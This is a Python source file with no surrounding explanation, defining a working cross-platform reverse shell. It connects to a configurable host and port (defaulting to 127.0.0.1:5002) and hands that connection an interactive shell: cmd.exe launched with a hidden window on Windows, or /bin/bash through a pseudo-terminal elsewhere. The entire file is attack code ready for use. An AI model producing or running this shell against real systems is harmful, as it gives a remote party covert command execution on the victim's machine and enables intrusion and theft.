def tcp_shell(HOST="127.0.0.1", PORT=5002):
    
    
    import socket
    import os
    import select
    import subprocess
    import threading
    if os.name == "nt":
        print("Windows")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        
        # For a hidden window:
        CREATE_NO_WINDOW = 0x08000000

       
        p = subprocess.Popen(
            ["cmd.exe"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            creationflags=CREATE_NO_WINDOW
        )

        def read_from_process(pipe):
            """ Continuously read the subprocess pipe (stdout or stderr) 
                and forward it to the socket. """
            while True:
                data = pipe.read(1)  
                if not data:
                    break
                s.sendall(data)

        def write_to_process():
            """ Continuously read data from the socket and write it 
                into the subprocess's stdin. """
            while True:
                try:
                    data = s.recv(1024)
                except:
                    break

                if not data:
                    break
                p.stdin.write(data)
                p.stdin.flush()

        
        t1 = threading.Thread(target=read_from_process, args=(p.stdout,))
        t2 = threading.Thread(target=read_from_process, args=(p.stderr,))
        t3 = threading.Thread(target=write_to_process)

        for t in (t1, t2, t3):
            t.daemon = True
            t.start()

       
        t1.join()
        t2.join()
        t3.join()

        # Clean up
        s.close()
        try:
            p.kill()  
        except:
            pass
    else:
        import pty
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.setblocking(0)  
           

            
            pid, fd = pty.fork()
            if pid == 0:
               
                os.environ['TERM'] = 'xterm'  # Set a basic terminal type
                os.execle('/bin/bash', '/bin/bash', '-i', {k: v for k, v in os.environ.items()})
            else:
               
                while True:
                    rlist, _, _ = select.select([s, fd], [], [])

                    if s in rlist:
                        try:
                            data = s.recv(1024)
                            if not data:
                                break
                            os.write(fd, data)
                        except Exception as e: 
                            print(f"Error receiving from server: {e}")
                            break

                    if fd in rlist:
                        try:
                            data = os.read(fd, 1024)
                            if not data:
                                break
                            s.send(data)
                        except Exception as e: 
                            print(f"Error receiving from shell: {e}")
                            break

        except Exception as e:
            print(f"Error in tcp_shell: {e}")
        finally:
            s.close()
            print("Connection closed. Exiting.")

if __name__ == "__main__":
    HOST = "127.0.0.1"
    PORT = 5002
    tcp_shell()